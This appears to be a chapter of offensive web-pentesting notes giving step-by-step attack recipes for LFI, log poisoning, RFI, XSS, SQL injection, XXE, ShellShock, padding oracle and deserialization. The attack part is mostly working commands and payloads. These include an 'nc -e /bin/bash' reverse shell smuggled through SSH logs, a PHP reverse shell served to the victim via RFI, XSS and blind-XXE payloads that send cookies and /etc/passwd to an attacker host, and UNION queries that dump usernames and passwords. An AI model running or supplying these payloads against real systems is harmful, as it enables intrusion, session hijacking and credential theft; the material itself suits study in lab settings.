# (PART) Vulnerabilies Assessment{-}

# Searching for exploits {-}

## Exploit database {-}

Exploit database or exploit-db is a website where attackers can find exploits over services in a specific version.

[exploit-db website](https://www.exploit-db.com/)

## Searchsploit {-}

**Searchsploit** is a command line tool directly binded to exploits-db.com that helps attacker find exploits over services in a specific version.

```bash
searchsploit <service name + version>
```

# Web Vulneratilities {-}

## ByPass Login Password vulnerabilites {-}

### strcmp {-}

**strcmp** is a programming error in php when it is used to compare user entries because it's not taking care of
the entry type.

```bash
username=admin&password=admin # -> don't work
username[]=admin&password[]=admin # -> work
```

## LFI (Local File inclusion) {-}

/etc/passwd
/etc/group

```bash
curl -s "http://localhost/example.php?file=/etc/passwd" | grep "sh$"
curl -s "http://localhost/example.php?file=/home/looping/.ssh/id_rsa"
```

/proc/shed_debug
/proc/shedstat
/proc/net/fib_trie

```bash
curl -s "http://localhost/example.php?file=/proc/net/fib_trie" | grep -i "host local" -B 1 | grep -oP '\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}' | sort -u
```

/proc/net/tcp

```bash
for port in $(curl -s "http://localhost/example.php?file=/proc/net/tcp" | awk '{print $2}' | grep -v "local_address" | awk -F ':' '{print $2}' | sort -u); do echo "[$port] -> Port number $(echo "ibase=16; $port" | bc); done

lsof -i:<port>
```

> [ ! ] Note: Be carefull to path traversal ?file=/../../../../../../../etc/passwd  
> [ ! ] Note: Try also null byte and interogation at the end (%00 or ?) at the end -> ../../../etc/passwd%00 or ../../../etc/passwd?

Chrome check file as raw Ctrl+u

## Wrappers {-}

```bash
curl -s "http://localhost/example.php?file=file:///etc/passwd"
```

```bash
curl -s "http://localhost/example.php?file=php://filter/convert.base64-encode/resource=example2.php"

echo "<base64 code>" | base64 -d; echo
```

## Log Poisoning {-}

Log Poisoning allows user to execute command remote system using logs files. This technic comes basicaly after finding a LFI
vulnerability and is used for gaining access to the victim system by generating a reverse shell.

### Apache2 {-}

```bash
curl -s "http://localhost/example.php?file=/var/log/apache2/access.log"

curl -s -H "User-Agent: <?php system('whoami'); ?> "http://localhost/example.php?file=/var/log/apache2/access.log"
```

### ssh logs {-}

```bash
curl -s "http://localhost/example.php?file=/var/log/auth.log"
echo "nc -e /bin/bash 127.0.0.1 443" | base64; echo

#output
bmMgLWUgL2Jpbi9iYXNoIDEyNy4wLjAuMSA0NDMK


ssh '<?php system("echo bmMgLWUgL2Jpbi9iYXNoIDEyNy4wLjAuMSA0NDMK | base64 -d | bash"); ?>'@127.0.0.1

```

## RFI (Remote File inclusion) {-}

**RFI** is a vulnerability similar to the **LFI** but using a necessary third part. Instead of looking for internal files,
**RFI** vulnerability allows the system or the service to look also, throw internet, of files from services located in an external 
Server.

Let's take the example of an existing RFI vulnerability from *gwolle-gb* wordpress plugin:

```bash
wfuzz -c --hc=404 -w /opt/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt http://127.0.0.1/fuzz

#Output
Payload : "wp-content/plugins/gwolle-gb"

searchsploit gwolle
#Output
WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File inclusion  |  php/webapps/38861.txt

searchsploit -x php/webapps/388861.txt
#Output
HTTP GET parameter "abspath" is not being properly sanitized before being used in PHP require() function. A remote attacker can include a file named 'wp-load.php' from arbitrary remote server and execute its content on the vulnerable web server. In order to do so the attacker needs to place a malicious 'wp-load.php' file into his server document root and includes server's URL into request:
http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]
```

In this case you can see that because of the fact that this plugin is not properly sanitized, the require method is looking for a wp-load.php file that can come from
another computer.

1. download php reverse shell example  

    ```bash
    cd content
    wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
    tar -xf php-reverse-shell-1.0.tar.gz
    mv php-reverse-shell-1.0/php-reverse-shell.php wp-load.php
    sed -i 's/127.0.0.1/<attacker_ip>/' wp-load.php
    sed -i 's/1234/443/' wp-load.php
    python3 -m http.server 80
    ```

1. listen to port 443  

    ```bash
    nc -nlvp 443
    ```

1. send the **RFI** 

    ```bash
    curl -s "http://127.0.0.1/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://<attacker_ip/"
    ```

**That's it**


## HTML Injection {-}

**HTML Injection** is a vulnerability that allows people to insert, most probably via a input text, a html tag. This vulnerability can
be verified in a forum or a notes application for example by inserting `<h1>test</h1>` or a `<marquee>this note will move</marquee>` and if the
result is interpreted, that means that the application is vulnerable to HTML Injection and most probably to **XSS Injection**

## XSS (Cross site scripting) {-}

**XSS Injection** comes from the family of **HTML Injection** and use the `<script />` tag for using javascript and inject commands via a programming 
language. This technic is commonly used for change session cookies content.

```html
<script>alert(document.cookie)</script>
```

## XSS Blind {-}

**XSS Blind** is the common way to sleal the session cookie of a user by sending the information to a third part server.

1. Attacker create a small web server  

    ```bash
    python3 -m http.server 8080
    ```

1. Attacker put the malicious XSS script on the web app  

    ```html
    <script>document.write('<img src="http://<attacker_ip>:8080/img.jpg?cookie=' + document.cookie + '">')</script>
    ```

1. Read the cookie on the small web server  

    ```bash
    #Output
    10.10.12.24 -- [date] "GET /img.jpg?cookie=PHPSESSID=2qjc9psdroeqb0qcppnqdmhgp8 HTTP/1.1" 404 -
    ```

1. Attacker can now update the cookie with the EditThisCookie chrome extension. 

## XSS By victim operation {-}

1. Attacker create a web server with python

    ```bash
    python3 -m http.server 80
    ```

1. Attacker create a js script 

    ```javascript
    var request = new XMLHttpRequest();
    request.open('GET', 'http://10.10.17.51/?cookie='+document.cookie, true);
    request.send();
    ```

1. Attacker put a malicious XSS script on the web app

    ```bash
    <script src="http://10.10.17.51/pwnd.js"></script>
    ```

1. Read the cookie on the small web server  

    ```bash
    #Output
    10.10.10.154 - - [27/Oct/2021 23:18:07] "GET /pwnd.js HTTP/1.1" 200 -
    10.10.10.154 - - [27/Oct/2021 23:18:07] "GET /?cookie=username=YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20id=1 HTTP/1.1" 200 -
    ```

## CSRF (Cross-site Request Forgery) {-}

**CSRF** is a vulnerability that allows attacker to send a request for example a form that normaly is send by the method **POST** throw
another method like **GET**. It's commonly used in order to change a password. The attacker is now able to send a link that will change 
automatically the password of a victim.

Imagine that there is a function in a web app that allows user to change their password. The Request in BurpSuite will probably look like that.

```{r, echo = FALSE, fig.cap="csrf post request", out.width="90%"}
knitr::include_graphics("images/csrf-post.png")
```

To check if this web app is vulnerable to **CSRF**, with BurpSuite right click and selecting *change request method* and you will se that the
request has now changed to a **GET** method and looks like the following

```{r, echo = FALSE, fig.cap="csrf updated to GET", out.width="90%"}
knitr::include_graphics("images/csrf-get.png")
```

If this change allows still user to change his password that means that this app is vulnerable to **CSRF** and attacker can send this link to
the victim in order to change his password with the attacker desired password.

> [ ! ] NOTE: In order to send another url text than the normal one, use a URL SHORTENER like bitly or others. 
@S4vitaar Estoy siguiendo tus cursos por el momento youtube de web pentest y tenia una pregunta, se puede hacer un cross site request forgery con un cross site scripting javascript?

## SSRF (Server-Side Request Forgery) {-}

A big difference bitween **CSRF** and **SSRF** is that with **Server-Side Request Forgery**, attacker doesn't need to interact with the victim to exploit the 
vulnerability. Attacker can use this vulnerability to send commands at server level. 

## SQL Truncate {-}

A **SQL Truncate** vulnerability allows attacker to access any users account with it own password. This flaw comes from a non validation of a user input size that is used
in a SQL request where the value of the Column value have a max size predefined.
If we have a SQL column created with a predefined size, for example 16bytes `email varchar(32)`, and the user inject an email that exced thos 16 caracters, the behaviour of
a simple check that control if the email exist is update by a behaviour of changing the password of this email.

1. Attacker needs to know a valid email adress or username
1. Wen creating a new user, add as email or username the known one by adding spaces caracters + another caracter at the end to pass the limit of caracters accepted by the column size.
1. Instead of creating a user, it will change the password of the known one

Example.

Attacker knows that there is a user admin because when he want to register a user called admin, the app says that user already exists.
If the app is vulnerable to a SQL Truncate, and attacker thinks that the username columns has been created with a 16 bytes size `username varchar(16)`, he can
create a new user called `admin______________.` (*Underscores replace the space charactes*) with the password he wants.
In this case, instead of creating a user called `admin______________.`, the behaviour change and update the password of the user `admin`.

The attacker can then connect as admin with the password he wants.

## SQL Injection - Error Based {-}

An **Error based SQL Injection** is a type of sql injection that profit to a syntax error attack type. Attacker can then profit those errors to list priviledge 
informations.

```bash
MySql [database]> select username,password from users where id = 1 ';
#Output
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that correspond to you MySqlDB server version for the right syntax to use near '''' at line 1 
```

> [ ! ] NOTE: The error here comes from the ' at the end of the line.

```{r, echo = FALSE, fig.cap="sql error based on screen", out.width="90%"}
knitr::include_graphics("images/sql-error-based.png")
```

How can Attacker take profit of this vulnerability:

1. List total number of column of the table  

    ```bash
    MySql [database]> select * from users order by 100;
    #Output
    ERROR 1054 (42S22): Unknown column '100' in 'order clause'

    MySql [database]> select * from users order by 4;
    #Output
    +----+----------+----------+---------+  
    | id | username | password | email   |  
    +----+----------+----------+---------+  
    | 2  | zeto     | test1234 | a@a.com |  
    | 3  | rob2     | test3434 | b@b.com |  
    | 1  | arif2    | test2331 | c@c.com |  
    +----+----------+----------+---------+  
    ```
    ```{r, echo = FALSE, fig.cap="sql error based order by 100", out.width="90%"}
    knitr::include_graphics("images/sql-error-based-url-by-100.png")
    ```

1. Get column names

    ```bash
    MySql [database]> select * from users union select 1,2,3,4;
    #Output
    +----+----------+----------+---------+  
    | id | username | password | email   |  
    +----+----------+----------+---------+  
    | 2  | zeto     | test1234 | a@a.com |  
    | 3  | rob2     | test3434 | b@b.com |  
    | 1  | arif2    | test2331 | c@c.com |  
    | 1  | 2        | 3        | 4       |  
    +----+----------+----------+---------+  
    # Also possible with strings and functions

    MySql [database]> select * from users union select 1,"test",3,database();
    #Output
    +----+----------+----------+---------+  
    | id | username | password | email   |  
    +----+----------+----------+---------+  
    | 2  | zeto     | test1234 | a@a.com |  
    | 3  | rob2     | test3434 | b@b.com |  
    | 1  | arif2    | test2331 | c@c.com |  
    | 1  | test     | 3        | database|  
    +----+----------+----------+---------+    
    ```

    Usefull functions to be used in order to retrieve relevant informations:  
    - database()
    - user()
    - load_file('/etc/passwd')


1. Get all the table names from database  

    ```bash
    MySql [database]> select * from users union select table_name,2,3,4 from information_schema.tables where table_schema = "database";
    ```

1. Get all databases  

    ```bash
    MySql [database]> select * from users union select schema_name,2,3,4 from information_schema.schemata;
    MySql [database]> select * from users union select schema_name,2,3,4 from information_schema.schemata limit 1,1; #show the first database
    MySql [database]> select * from users union select schema_name,2,3,4 from information_schema.schemata limit 2,1; #show the second database
    ```

1. Get Columns name of a table  

    ```bash
    MySql [database]> select * from users union select column_name,2,3,4 from information_schema.columns where table_schema = "database" and table_name = "users";
    ```

1. Display User and Passwords  

    ```bash
    MySql [database]> select * from users union select concat(username,0x3a,password),2,3,4 from database.users;
    ```

    or with group concat

    ```bash
    MySql [database]> select * from users union select group_concat(username,0x3a,password),2,3,4 from database.users;
    ```


> [ ! ] NOTE: In a web app you might need to finish the sql injection by **-- -**

> [ ! ] NOTE: sometimes quotes or double quotes can not be used in web services url, but you can bypass that by using hexadecimal 
> value `echo "database" | xxd -ps` -> 64617461626173650a so table_schema = "database" is the same as table_schema = 0x6461746162617365

## SQL Injection - Time Based {-}

**SQL Injection time based** is a technic that attacker can use when the database is not visiblie (Blind) in the web application. The purpose is the same as the
sql injection error based but needs a sleep(5) function to guess the searched values.

## SQL Injection - Boolean Based {-}

**SQL Injection boolean based** is a kind of **error based** technic. The difference here is that the attacker is not looking at the information because
it is not revealed by the web app. The only thing that the attacker know is if it's sql command get an error or not. As the time **time based** technic, 
the attacker use that to guess the searched value.
In this case, **SQLMap** is usefull.

## SQLMap {-}

**SQLMap** is an automatic tool that perform sql injections.

```bash
sqlmap -u http://10.124.211.96/details.php?id=2
# SQLMap identify the param id as injectable
sqlmap -u http://10.124.211.96/details.php?id=2 --tables
# SQLMap get the tables and db information
sqlmap -u http://10.124.211.96/details.php?id=2 -D db -T users --dump
# SQLMap dump the users table


```

## Padding Oracle Attack (Padbuster) {-}

1. Recover cookie session and name
1. Decode cookie with padbuster  

    ```bash
    padbuster http://<website_url>/login.php p4YaK6FAadDiK24eOGcORpxvxiAchu%2Fy 8 -cookie "auth=p4YaK6FAadDiK24eOGcORpxvxiAchu%2Fy" -encoding 0
    ```

> [ ! ] NOTE: If you see that the webapp is vulnerable to padding oracle attack, that the user *admin* is valid and you see that the webapp have 
a Registration page you can, you can put as a username *admin=* and you will be logged as admin manualy.


## Padding Oracle Attack (Bit Flipper Attack - BurpSuite) {-}

The **Bit Flipper attack** is an attack that takes the cookie of a user created with a very similar name as the victim name and flip Bits in order to retrieve the
desired session cookie

1. create a user name very similar as the victim (in this case bdmin for admin)

    ```{r, echo = FALSE, fig.cap="sql error based order by 100", out.width="90%"}
    knitr::include_graphics("images/bit-flip-registration.png")
    ```

1. check the session cookie of user bdmin with BurpSuite  

    ```{r, echo = FALSE, fig.cap="sql error based order by 100", out.width="90%"}
    knitr::include_graphics("images/bit-flip-checkcookie.png")
    ```

1. Ctrl+i to emit that to the BurpSuite intruder and go to intruder Positions to do a Sniper Attack  

    ```{r, echo = FALSE, fig.cap="sql error based order by 100", out.width="90%"}
    knitr::include_graphics("images/bit-flip-sniperattack.png")
    ```

1. Go to Payloads and select Bit flipper in payload type, Literal value in Format original data, select all the bits and uncheck Url encode these characters  

    ```{r, echo = FALSE, fig.cap="sql error based order by 100", out.width="90%"}
    knitr::include_graphics("images/bit-flip-payloadoption.png")
    ```

1. Go to option and add a Grep Extract  
    - Add Grep Extract  

        ```{r, echo = FALSE, fig.cap="sql error based order by 100", out.width="90%"}
        knitr::include_graphics("images/bit-flip-addgrepextract.png")
        ```
    
    - Fetch Response  

        ```{r, echo = FALSE, fig.cap="sql error based order by 100", out.width="90%"}
        knitr::include_graphics("images/bit-flip-fetchresponse.png")
        ```
    
    - Generate regexp by selecting the output you want to analyse  

        ```{r, echo = FALSE, fig.cap="sql error based order by 100", out.width="90%"}
        knitr::include_graphics("images/bit-flip-selectresponse.png")
        ```

1. Click on start attack button  

    ```{r, echo = FALSE, fig.cap="sql error based order by 100", out.width="90%"}
    knitr::include_graphics("images/bit-flip-startattack.png")
    ```

1. Find and select a row where you see *You are currently logged in as admin!*  


You can then copy the payload and past it in a EditThisCookie tool.

## ShellShock {-}

**ShellShock** attack use a vulnerability (bug) that comes from sending data to a **mod_cgi** file, but also to other extension files like **python** or **perl**...
This vulnerability has been found by changing the User-Agent in order to execute RCE.

Imagine having a login page that send request to a `.cgi` file, you can use **BurpSuite** or **curl** in order to change the User-Agent and execute RCE.
The most common example cames by ejecting de CD drive.

```bash
curl -H "User-Agent: () { :; }; /bin/eject" http://example.com/
```


## XXE (XML External Entity Injection) {-}

**XML External Entity Injection** is usualy seen when the webapp try to convert the entries of the user to an XML syntax
before sending that to the server. The problem with this technic is that the attacker can use the power of XML (with its entities)
to take profit of the system and get a **LFI**

```xml
<?xml version"1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
<order>
    <quantity>3</quantity>
    <item>&xxe;</item>
    <address>17th Estate, CA</address>
</order>
```

As it works like a **LFI**, attacker can check for sensitive files like `id_rsa`

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/id_rsa" >]>
<elements>
    <Author>&xxe;</Author>
    <Subject>EEEEEEEEE</Subject>
    <Content>EEEAEAEAAAEAAEAE</Content>
</elements>
```

## Blind XXE {-}

There is occasions where the **XXE** vulnerability exists but is not reported in a visible way. In this case the vulnerability treatment
is the same as the normal XXE, but we have to use a third part to collect the information.

1. In the attacker machine we create a malicious XML file

    ```xml
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
    <!ENTITY % poc "<!ENTITY &#37; xxe SYSTEM 'http://<attacker_ip>/value=?%file;'>">
    ```

1. We create a web server with python

    ```bash
    python3 -m http.server 80
    ```

1. We send the XXE in the vulnerable server by calling remote ENTITIES

    ```xml
    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ENTITY % REMOTE SYSTEM "http://<attacker_ip"/data.xml>
    %remote;
    %poc;
    %xxe;
    ]>
    ```

Here we can get the result in a base64 encode on the web server request argument.

## Domain Zone Transfer {-}

This vulnerability comes with Domain controller machines and allows attacker to enumerate available subdomains.
We use the dig tool to exploit this vulnerability but we first need a domain name.

1. We check if the domain found is correct

    ```bash
    dig @10.10.10.10 domainfound.com
    ```

1. If the domain is correct we can check common services like

    ```bash
    dig @10.10.10.10 domainfound.com ns
    dig @10.10.10.10 domainfound.com mx
    ```

1. Finaly we can proceed to a domain zone transfer attack

    ```bash
    dig @10.10.10.10 domainfound.com axfr
    ```

If the domain controller is vulnerable we can retrieve subdomains.

## Insecure Deserialization {-}

This vulnerability comes after a deserialization process of a data. Imagine you send a data of the following format

```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('whoami', function(error,stdout,stderr){ console.log(stdout) });}"}
```

If the server calls a deserialize function and that's vulnerable, this payload will not be executed because it will take the payload as a string. 
But, by adding parenthesis at the end of the payload the vulnerability will be exposed and the code will be executed

```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('whoami', function(error,stdout,stderr){ console.log(stdout) });}()"}
```

## Type Juggling {-}

The **Type Juggling** vulnerability comes by the call of functions like `strcmp` that are vulnerable to types comparison.
If the code behind use a comparison like,

```php
$pwd = "admin1234!";

if(strcmp($_POST["password], $PASSWORD) == 0){
    echo "You are connected";
} else {
    echo "Access denied"
}
```

you can change de type of the password value to retrieve a **0 return value**. Attacker change the type of value by adding **[]**

```bash
curl -s -X POST --data 'user=admin&password=test' http://127.0.0.1/login.php
#Output
Access denied

curl -s -X POST --data 'user=admin&password[]=test' http://127.0.0.1/login.php
#Output
You are connected
```

## SSTI {-}

Flask/Jinja2 -> Server Side Template Injection
